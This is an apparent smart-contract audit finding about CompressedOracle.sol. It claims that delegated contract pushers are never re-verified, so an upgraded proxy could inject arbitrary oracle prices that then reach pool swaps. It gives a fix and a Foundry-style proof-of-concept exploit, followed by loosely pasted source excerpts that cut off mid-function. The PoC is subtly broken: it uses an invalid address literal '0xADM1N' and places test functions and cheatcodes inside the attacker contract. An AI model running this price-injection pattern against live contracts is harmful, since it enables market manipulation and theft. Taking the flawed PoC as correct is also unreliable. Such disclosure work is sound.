### Title
Permanent contract-pusher delegation with no push-time re-verification allows an upgraded proxy to inject arbitrary prices into a creator's namespace — (`File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowContractPushers` grants permanent namespace write authority to a contract based on a single, one-time `isPusher(creator)` staticcall. The `fallback()` push path never re-verifies this consent. If the delegated contract is an upgradeable proxy, its admin can change the implementation after delegation, giving the new implementation unconditional write authority over the creator's feed namespace — and therefore over every pool that reads those feeds.

---

### Finding Description

`allowContractPushers` performs a live `isPusher(creator)` staticcall at delegation time and, if it returns `true`, permanently writes `namespaceRemapping[pusher] = creator`:

```solidity
// CompressedOracle.sol L226-231
(bool ok, bytes memory res) = pusher.staticcall(
    abi.encodeWithSignature("isPusher(address)", msg.sender)
);
require(ok);
bool allowed = abi.decode(res, (bool));
require(allowed);
namespaceRemapping[pusher] = msg.sender;
```

The `fallback()` push path resolves the namespace from this mapping alone — no re-verification of `isPusher` occurs at push time:

```solidity
// CompressedOracle.sol L315-316
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
```

The design comment states "consent is proven by a LIVE `isPusher(creator)` staticcall" — but "live" only applies at delegation time. After delegation, the mapping entry is permanent until the creator calls `removePushers` or the pusher calls `revokePusher`.

If the delegated contract is an upgradeable proxy (UUPS, Transparent, or Beacon), its proxy admin — a party distinct from the creator — can upgrade the implementation. The new implementation retains the `namespaceRemapping` entry and can call `oracle.fallback()` with arbitrary slot words, overwriting any feed in the creator's namespace with crafted prices, spreads, and timestamps.

The production deployment script confirms `allowContractPushers` is used in production:

```solidity
// script/SetAllowance.sol L22
oracle.allowContractPushers(pushers);
```

---

### Impact Explanation

The corrupted slot word flows directly into the price read path consumed by `AnchoredPriceProvider._readLeg`:

```solidity
// AnchoredPriceProvider.sol L280
(mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);
```

The attacker controls all four 48-bit lanes in the slot word: the `U64x32`-encoded price `p`, and the two `Codebook256` spread indices `s0`/`s1`. By setting a fresh timestamp (within `MAX_TIME_DRIFT`) and a spread below `MAX_SPREAD_BPS`, the attacker bypasses every downstream guard in `_readLeg` (staleness, zero-mid, stall-marker, price-guard) and delivers an arbitrary bid/ask to the pool swap. This constitutes bad-price execution and swap conservation failure: traders receive more than the oracle/bin curve permits, or the pool fails to receive owed input.

---

### Likelihood Explanation

- The creator must have delegated to an upgradeable proxy contract via `allowContractPushers`. This is a realistic production pattern — the production script already calls this path.
- The proxy admin (a party separate from the creator) must upgrade the implementation. This is a normal operational action for upgradeable contracts.
- No oracle admin or creator action is required after delegation; the proxy admin acts unilaterally.
- The `fallback()` push path is permissionless for any address in `namespaceRemapping`, so no further privilege is needed once the upgrade is executed.

Likelihood: **Medium** (requires an upgradeable contract pusher to be in production use, which the deployment script shows is the intended pattern).

---

### Recommendation

Re-verify `isPusher(creator)` at push time inside `fallback()`, or add an explicit re-verification hook. The simplest fix is to check `isPusher` on every push for contract pushers:

```solidity
// In fallback(), after resolving creator from namespaceRemapping:
if (creator != msg.sender) {
    // Re-verify contract pushers; EOAs cannot implement isPusher so skip them.
    if (msg.sender.code.length > 0) {
        (bool ok, bytes memory res) = msg.sender.staticcall(
            abi.encodeWithSignature("isPusher(address)", creator)
        );
        require(ok && abi.decode(res, (bool)), "pusher consent revoked");
    }
}
```

Alternatively, follow the MakerDAO TUSD adapter pattern: emit an event or revert on any push from a contract pusher whose `isPusher` now returns `false`, effectively freezing interactions with the delegated contract if its behavior changes.

A simpler mitigation is to document that `allowContractPushers` must never be used with upgradeable proxies, and add a code-size + proxy-detection guard at delegation time.

contract UpgradeablePusherV1 {
    function isPusher(address) external pure returns (bool) { return true; }
}

contract UpgradeablePusherV2 {
    // No isPusher — but namespaceRemapping entry persists from V1 delegation.
    // The proxy admin calls oracle.fallback() directly via this contract.
    function pushArbitraryPrice(address oracle, bytes memory payload) external {
        (bool ok,) = oracle.call(payload);
        require(ok);
    }

    CompressedOracleV1 oracle;
    address creator = address(0xC0FFEE);
    address proxyAdmin = address(0xADM1N);

    // Simulated proxy storage
    address implementation;

    function isPusher(address) external view returns (bool) {
        return UpgradeablePusherV1(implementation).isPusher(address(0));
    }

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 60_000);
        vm.warp(1_700_000_000);
        implementation = address(new UpgradeablePusherV1());
    }

    function testUpgradedProxyInjectsArbitraryPrice() public {
        // Step 1: Creator delegates to the "proxy" (this contract acts as proxy)
        address[] memory pushers = new address[](1);
        pushers[0] = address(this);
        vm.prank(creator);
        oracle.allowContractPushers(pushers);
        assertEq(oracle.namespaceRemapping(address(this)), creator);

        // Step 2: Proxy admin upgrades implementation — isPusher now irrelevant
        vm.prank(proxyAdmin);
        implementation = address(new UpgradeablePusherV2());

        // Step 3: Attacker (proxy admin) pushes arbitrary price via oracle.fallback()
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint32 arbitraryPrice = 9_999_999; // U64x32-encoded extreme price
        uint8 s0 = 5; uint8 s1 = 5;
        uint48 raw = (uint48(arbitraryPrice) << 16) | (uint48(s0) << 8) | uint48(s1);
        uint8 slotId = 0;
        uint256 word = (uint256(tsMs) << 8) | uint256(slotId);
        word |= uint256(raw) << 208; // position 0

        // This contract is still in namespaceRemapping → push lands in creator's namespace
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok, "arbitrary push succeeded");

        // Step 4: Verify the corrupted price is now in the creator's namespace
        bytes32 feedId = oracle.feedIdOf(creator, 0, 0);
        IOffchainOracle.OracleData memory data = oracle.getOracleData(feedId);
        assertEq(data.price, U64x32.decode(arbitraryPrice), "attacker price in creator namespace");
        // This price will now be consumed by AnchoredPriceProvider._readLeg → bad swap execution
    }
}

    /// @notice Contract-pusher variant: consent is proven by a LIVE `isPusher(creator)`
    ///         staticcall instead of a signature, so there is nothing to replay and no
    ///         deadline is needed.
    function allowContractPushers(address[] calldata pushers) external {
        uint256 l = pushers.length;
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            (bool ok, bytes memory res) = pusher.staticcall(abi.encodeWithSignature("isPusher(address)", msg.sender));
            require(ok);
            bool allowed = abi.decode(res, (bool));
            require(allowed);

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }

    fallback() override external {
        uint256 end;
        uint256 namespace;

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }

        // 4 * 6 + 7 + 1 = 32 bytes per slot
        if (end == 0 || end % 32 != 0) revert BadCalldataLength();

        for (uint256 ptr = 0; ptr < end; ptr += 32) {

    function _readLeg(bytes32 feedId)
        internal returns (uint256 mid, uint256 spreadBps, uint256 refTime, bool ok)
    {
        (mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);

        // Stale reference → not ok. Clamping to a stale anchor is the one false-safety case.
        if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);

        // Basic validity — mid positive, spreadBps not the stalled/off-hours marker (the Chainlink oracle
        // writes spreadBps = ORACLE_BPS when an RWA market is closed).
        if (mid == 0 || spreadBps >= ORACLE_BPS) return (mid, spreadBps, refTime, false);

        // Per-leg price guard.
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(feedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) return (mid, spreadBps, refTime, false);

        ok = true;
    }
